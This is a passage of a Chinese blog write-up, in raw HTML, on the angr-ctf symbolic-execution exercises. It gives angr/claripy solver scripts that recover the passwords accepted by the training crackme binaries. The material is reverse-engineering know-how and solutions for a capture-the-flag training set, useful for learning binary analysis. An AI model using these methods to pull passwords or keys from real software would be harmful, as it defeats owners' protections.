class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./03_angr_symbolic_registers&#x27;</span><br>    proj = angr.Project(bin_path)<br>    <span class="hljs-comment"># blank_state() means creating an empty state and set the current PC to specific addr</span><br>    start_addr = <span class="hljs-number">0x8049670</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create  symbolic variables with claripy.BVS(name, size), size is counted by bits</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_1&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_2&#x27;</span>, <span class="hljs-number">32</span>) <span class="hljs-comment"># 32-bit registers</span><br>    <br>    <span class="hljs-comment"># set the init_state&#x27;s register to corresponding symbolic variables</span><br>    init_state.regs.eax = password_0<br>    init_state.regs.ebx = password_1<br>    init_state.regs.edx = password_2<br>    <br>    <span class="hljs-comment"># now solve it!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-comment"># we use state.solver.eval(BVS) to get the answer value there</span><br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_0)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_1)))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(solution_2)))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>很快啊，啪的一下就出来了.mkv</p><p><img src="https://s2.loli.net/2022/10/31/MkU5bdLO4js6ZXy.png" alt="image.png"></p><h2 id="04-angr-symbolic-stack：符号化栈">04_angr_symbolic_stack：符号化栈</h2><p>还是惯例拖入 IDA，主要的处理逻辑在 <code>handle_user()</code> 当中，还是读入两个数之后扔给不同的 complex 函数处理：</p><p><img src="https://s2.loli.net/2022/10/31/TZrWvDe5iq3R1E7.png" alt="image.png"></p><p>然后你会发现用上上题的脚本也能秒解…不过这样就不是这道题出题的目的了：）</p><p>重新读一下题目——<code>symbolic stack</code>，这意味着<strong>本题我们应当将栈设置为符号变量来进行约束求解</strong></p><p>那么我们该怎么做呢？重新来看 <code>handler_user()</code> 的汇编代码，两个待求解变量都是位于栈上的固定位置：</p><p><img src="https://s2.loli.net/2022/10/31/ihsBNwyqpUJrneg.png" alt="image.png"></p><p>那么我们还是可以将初始状态设置为从读入输入后开始的空白状态，之后创建两个位向量符号，设置好 ebp 和 esp 的相对位置后使用  <code>state.stack_push(val)</code> 来<strong>手动地将符号变量推到栈上</strong>，最后的求解路径还是设为输出 <code>&quot;Good Job.&quot;</code> 的地址即可，这里需要注意仔细计算变量在栈上的位置</p><p>求解脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import sys<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./04_angr_symbolic_stack&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x80493EF # first insn after `call scanf`<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # create symbolic variables<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 32) # 32-bit integer<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 32) # 32-bit integer<br>    <br>    # set the context<br>    init_state.regs.ebp = init_state.regs.esp<br>    ## first val is on [ebp - 0xC], so we need to `sub esp` so that we can push properly<br>    init_state.regs.esp -= 0x8<br>    ## these two variables are continuous on the stack<br>    init_state.stack_push(password_0)<br>    init_state.stack_push(password_1)<br>    ## the relative position of esp when return from scanf()<br>    ## seems that it&#x27;s okay to not do it?<br>    init_state.regs.esp -= 12<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x804943C, avoid = 0x804942A)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0)<br>        solution_1 = solution_state.solver.eval(password_1)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/e7sESMFHzIxb26X.png" alt="image.png"></p><h2 id="05-angr-symbolic-memory：符号化内存">05_angr_symbolic_memory：符号化内存</h2><p>还是惯例地拖入 IDA，这一次是读入四个 8 字节到一块连续的 32 字节内存上，其中 <code>user_input</code> 的地址便是 <code>0x82F48A0</code>，之后调用 <code>complex_function()</code> 逐字符处理这 32 字节后与特定字符串进行对比：</p><p><img src="https://s2.loli.net/2022/10/31/ZhNrVoe3gK9G5PJ.png" alt="image.png"></p><p>那么从题目名称我们不难看出<strong>这一次我们应当要将内存作为符号变量进行约束求解</strong></p><h3 id="state-的内存操作">state 的内存操作</h3><p>前面讲到，对于一个状态的内存，我们可以使用 <code>state.memory</code> 的对应接口进行操作：</p><ul><li><code>state.memory.load(addr, size_in_bytes)</code> ：获取该地址上指定大小的位向量</li><li><code>state.memory.store(addr, bitvector)</code> ：将一个位向量存储到指定地址</li></ul><p>需要注意的是如果要储存具体值，则需要通过 <code>endness</code> 参数指定大小端序</p><h3 id="FINAL-EXPLOIT-3">FINAL EXPLOIT</h3><p>那么本题还是创建对应大小的 BVS 后 explore() 即可，需要注意的是在获取最后求解的值时别忘了指定参数 <code>cast_to=bytes</code> 以获得字符输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&#x27;./05_angr_symbolic_memory&#x27;</span><br>    proj = angr.Project(bin_path)<br>    start_addr = <span class="hljs-number">0x8049315</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    <span class="hljs-comment"># create symbolic variables</span><br>    password_0 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_1 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_2 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    password_3 = claripy.BVS(<span class="hljs-string">&#x27;password_0&#x27;</span>, <span class="hljs-number">64</span>) <span class="hljs-comment"># 8 bytes = 64 bits</span><br>    <br>    <span class="hljs-comment"># insert the symbolic vals into memory</span><br>    init_state.memory.store(<span class="hljs-number">0x82F48A0</span>, password_0)<br>    init_state.memory.store(<span class="hljs-number">0x82F48A8</span>, password_1)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B0</span>, password_2)<br>    init_state.memory.store(<span class="hljs-number">0x82F48B8</span>, password_3)<br>    <br>    <span class="hljs-comment"># now to solve!</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = <span class="hljs-number">0x8049381</span>, avoid = <span class="hljs-number">0x804936F</span>)<br>    <br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution_0 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_0, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_1 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_1, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_2 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_2, cast_to=<span class="hljs-built_in">bytes</span>)<br>        solution_3 = solution_state.solver.<span class="hljs-built_in">eval</span>(password_3, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_0: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_0))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_1: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_1))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_2: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_2))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password_3: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(solution_3))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>这次的求解需要一点点时间，以及一定量的内存（笔者仅 2G 内存的阿里云学生机在跑解题脚本时就被 Kill 了几次，最后不得不用一些方法腾一些内存后才搞定</p><p><img src="https://s2.loli.net/2022/10/31/5Mymf9v8dTKUFWu.png" alt="image.png"></p><h2 id="06-angr-symbolic-dynamic-memory：符号化动态分配内存">06_angr_symbolic_dynamic_memory：符号化动态分配内存</h2><p>惯例拖入 IDA 中，还是惯例地读入输入后 complex 处理后进行对比，不过不一样的是本题存储输入使用的是<strong>动态分配的内存</strong>：</p><p><img src="https://s2.loli.net/2022/10/31/dQEJzTtXKWZaPLV.png" alt="image.png"></p><p>那么怎么处理呢？我们可以从储存这两块内存的指针的地址入手，注意到两个指针 <code>buffer0</code> 与 <code>buffer1</code> 是两个全局变量：</p><p><img src="https://s2.loli.net/2022/10/31/XkKs9MjUmh2yGbw.png" alt="image.png"></p><ul><li>将初始状态设为<strong>读取完输入后的状态</strong></li><li>任意选两个地址作为 fake chunk 的地址，并将这两个 buffer 指针指向 fake chunk</li><li>再在 fake chunk 内存上放置相应的内存符号变量进行求解即可</li></ul><p>因为符号执行不会实际执行程序，所以这里我们任意设置 fake chunk 地址并不会导致 segmentation fault 的发生，需要注意的是对于具体的值而言我们别忘了通过 <code>endness</code> 参数指定大小端序</p><p>于是最后的解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python3">import angr<br>import claripy<br><br>def solver():<br>    bin_path = &#x27;./06_angr_symbolic_dynamic_memory&#x27;<br>    proj = angr.Project(bin_path)<br>    start_addr = 0x804938C # first insn after scanf()<br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    <br>    # set the buffer0&#x27;s and buffer1&#x27;s val to our specific address<br>    buf0_addr = 0x9B20684<br>    buf1_addr = 0x9B2068C<br>    fake_chunk0_addr = 0x1145140<br>    fake_chunk1_addr = 0x1919810<br>    init_state.memory.store(buf0_addr,fake_chunk0_addr, endness=proj.arch.memory_endness)<br>    init_state.memory.store(buf1_addr,fake_chunk1_addr, endness=proj.arch.memory_endness)<br>    <br>    # create symbolic vals and set fake_chunk to them<br>    password_0 = claripy.BVS(&#x27;password_0&#x27;, 64) # 8 bytes = 64 bits<br>    password_1 = claripy.BVS(&#x27;password_1&#x27;, 64) # 8 bytes = 64 bits<br>    init_state.memory.store(fake_chunk0_addr, password_0)<br>    init_state.memory.store(fake_chunk1_addr, password_1)<br>    <br>    # now to solve!<br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = 0x8049452, avoid = 0x8049440)<br>    <br>    if simgr.found:<br>        solution_state = simgr.found[0]<br>        solution_0 = solution_state.solver.eval(password_0, cast_to=bytes)<br>        solution_1 = solution_state.solver.eval(password_1, cast_to=bytes)<br>        <br>        print(&#x27;password_0: &#123;&#125;&#x27;.format(solution_0))<br>        print(&#x27;password_1: &#123;&#125;&#x27;.format(solution_1))<br>    else:<br>        raise Exception(&#x27;Could not find the solution!&#x27;)<br><br>if __name__ == &quot;__main__&quot;:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/6Oyk2cTxbDjpYVE.png" alt="image.png"></p><h2 id="07-angr-symbolic-file：符号化文件">07_angr_symbolic_file：符号化文件</h2><p>惯例拖入 IDA 中，发现其会先读入 64 字节，之后通过 <code>ignoreme()</code> 将其写入一个特定文件中，再从该文件中把输入读回来，之后就又是常规的 complex 操作一番后与一个特定字符串进行比对</p><p><img src="https://s2.loli.net/2022/10/31/snWIloVkGtUxcdz.png" alt="image.png"></p><p>比较容易想到的方法就是<strong>直接从文件读入结束后开始作为初始状态</strong>，之后用 05 的符号化内存的方法来求解，不过这样就不是这道题出题的目的了：）</p><h3 id="Emulated-Filesystem-angr-的文件系统">Emulated Filesystem - angr 的文件系统</h3><p>在 angr 当中与文件系统间的操作是通过 <code>SimFile</code> 对象完成的，SimFile 为对  <em>存储</em>  的抽象模型，一个 SimFile 对象可以表示一系列的字节、符号等</p><p>我们可以通过 <code>angr.SimFile()</code> 来创建一个模拟文件，创建带有具体值与符号变量的 SimFile 🌰如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr, claripy<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file = angr.SimFile(<span class="hljs-string">&#x27;a_file&#x27;</span>, content = <span class="hljs-string">&quot;flag&#123;F4k3_f1@9!&#125;\n&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">64</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_file2 = angr.SimFile(<span class="hljs-string">&#x27;another_file&#x27;</span>, bvs, size=<span class="hljs-number">8</span>) <span class="hljs-comment"># size in bytes there</span><br></code></pre></td></tr></table></figure><p>模拟文件需要与特定的状态进行关联，通过 <code>state.fs.insert(sim_file)</code> 或 <code>sim_file.set_state(state)</code> 我们可以将 SimFile 插入到一个状态的文件系统中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.fs.insert(<span class="hljs-string">&#x27;test_file&#x27;</span>, sim_file)<br></code></pre></td></tr></table></figure><p>我们还可以从文件中读取内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>pos = <span class="hljs-number">0</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>data, actural_read, pos = sim_file.read(pos, <span class="hljs-number">0x100</span>)<br></code></pre></td></tr></table></figure><p>对于  <em>流</em>  （Streams，例如标准IO、TCP连接等）类型的文件，我们可以用 <code>angr.SimPackets()</code> 来创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet = angr.SimPackets(<span class="hljs-string">&#x27;my_packet&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>sim_packet<br>&lt;angr.storage.file.SimPackets <span class="hljs-built_in">object</span> at <span class="hljs-number">0x7f75626a2e80</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-4">FINAL EXPLOIT</h3><p>那么本题实际上是让我们利用 angr 来创建一个<strong>模拟文件</strong>以模拟读取文件的过程，这里我们将初始状态设为从打开文件开始，之后创建一个位向量符号放入模拟文件并将模拟文件插入文件系统，之后探索到对应状态后求解即可，解题脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">avoid_path</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> state.posix.dumps(sys.stdout.fileno())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./07_angr_symbolic_file&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_address = <span class="hljs-number">0x8049550</span> <span class="hljs-comment"># first insn returned from ignoreme()</span><br>    init_state = proj.factory.blank_state(addr = start_address)<br><br>    <span class="hljs-comment"># create BVS and SimFile</span><br>    file_size = <span class="hljs-number">0x40</span><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>, file_size * <span class="hljs-number">8</span>) <span class="hljs-comment"># 0x40 bytes</span><br>    file_name = <span class="hljs-string">&#x27;KBECVEJF.txt&#x27;</span><br>    sim_file = angr.storage.SimFile(file_name, password, size = file_size)<br><br>    <span class="hljs-comment"># load the SimFile</span><br>    init_state.fs.insert(file_name, sim_file)<br><br>    <span class="hljs-comment"># solve it</span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = find_path, avoid = avoid_path)<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find the solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    solver()<br></code></pre></td></tr></table></figure><p>还是秒解：</p><p><img src="https://s2.loli.net/2022/10/31/lTfoUMzQANGSbnH.png" alt="image.png"></p><h1>0x03. angr-ctf：约束条件</h1><h2 id="08-angr-constraints：添加约束">08_angr_constraints：添加约束</h2><p>惯例拖入 IDA，还是读入输入后 complex 函数处理后进行比对的模式，这里的 <code>0x804C040</code> 就是 <code>buffer</code> 的地址，不过其自定义了一个对比函数：</p><p><img src="https://s2.loli.net/2022/10/31/4DXMH3GIQdiZOwC.png" alt="image.png"></p><p>自定义的对比函数比较常规，其中的 <code>0x804C030</code> 便是 <code>password</code> 的地址：</p><p><img src="https://s2.loli.net/2022/10/31/sxXtqvHYyiN5COg.png" alt="image.png"></p><p>在 <code>check_equals_xx()</code> 函数当中由于其选择了逐字符比较后增加计数的比较方式的缘故，会导致 <strong>路径爆炸</strong>（path explosion）的问题</p><h3 id="angr-中的约束">angr 中的约束</h3><p>前面我们讲到位向量之间可以进行运算，类似地，位向量之间也可以进行<strong>比较运算</strong> ，其结果为 <code>Bool</code> 类型的对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bvv = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv2 = claripy.BVV(<span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvv == bvv2<br>&lt;Bool <span class="hljs-literal">True</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs = claripy.BVS(<span class="hljs-string">&#x27;bvs&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs == bvv + bvv2<br>&lt;Bool bvs_0_32 == <span class="hljs-number">0xbd5b7dde</span>&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 = claripy.BVS(<span class="hljs-string">&#x27;bvs2&#x27;</span>, <span class="hljs-number">32</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>bvs2 &gt; bvs * bvv + bvv2<br>&lt;Bool bvs2_1_32 &gt; bvs_0_32 * <span class="hljs-number">0xdeadbeef</span> + <span class="hljs-number">0xdeadbeef</span>&gt;<br></code></pre></td></tr></table></figure><p>对于带有符号值的比较而言， <code>Bool</code> 类型的对象直接表示了对应的式子，因此可以作为<strong>约束条件</strong>被添加到一个状态当中，我们可以通过 <code>state.solver.add()</code> 为对应状态添加约束：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs == bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.add(bvs2 &gt; bvs * bvv + bvv2)<br><span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.<span class="hljs-built_in">eval</span>(bvs2) <span class="hljs-comment"># get the concrete value under constraints</span><br></code></pre></td></tr></table></figure><p>除了 Bool 类以外，Claripy 还提供了一些以位向量作为结果的运算操作，以下是一个🌰（完整的还是去读<a href="https://docs.angr.io/advanced-topics/claripy">文档</a>吧）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>claripy.If(bvs == bvs2, bvs, bvs2)<br>&lt;BV32 <span class="hljs-keyword">if</span> bvs_0_32 == bvs2_1_32 then bvs_0_32 <span class="hljs-keyword">else</span> bvs2_1_32&gt;<br></code></pre></td></tr></table></figure><h3 id="FINAL-EXPLOIT-5">FINAL EXPLOIT</h3><p>由于待比较字符串是固定的，故我们可以让 <code>explore()</code> 在完成对输入的变换后、在进入比较函数之前停下，之后直接为该状态手动添加一个对应的约束后进行求解即可</p><p>这里添加约束的方法是使用 <code>state.memory.load(addr, size_in_bytes)</code> 成员函数将当前状态的某个内存区域作为一个 BVS 提取出来，之后通过 <code>state.add_constraints(condition)</code> 添加约束指定该块内存在当前状态下的值为特定字符串，最后使用 <code>state.solver.eval()</code> 求解原来的 buffer 即可</p><p>最终的解题脚本如下，详见注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_file = <span class="hljs-string">&#x27;./08_angr_constraints&#x27;</span><br>    proj = angr.Project(bin_file)<br>    start_addr = <span class="hljs-number">0x804935D</span> <span class="hljs-comment"># first insn after scanf()</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br><br>    <span class="hljs-comment"># BVS for buffer</span><br>    buffer_addr = <span class="hljs-number">0x804C040</span><br>    buffer_size = <span class="hljs-number">0x10</span><br>    buffer = claripy.BVS(<span class="hljs-string">&#x27;buffer&#x27;</span>, buffer_size * <span class="hljs-number">8</span>)<br>    init_state.memory.store(buffer_addr, buffer)<br><br>    <span class="hljs-comment"># explore to check_equals()</span><br>    check_addr = <span class="hljs-number">0x80493A9</span> <span class="hljs-comment"># last insn before call check_equals() </span><br>    simgr = proj.factory.simgr(init_state)<br>    simgr.explore(find = check_addr)<br>    check_state = simgr.found[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-comment"># get the buffer BVS of check_state</span><br>    password = check_state.memory.load(buffer_addr, buffer_size)<br>    compared_str = <span 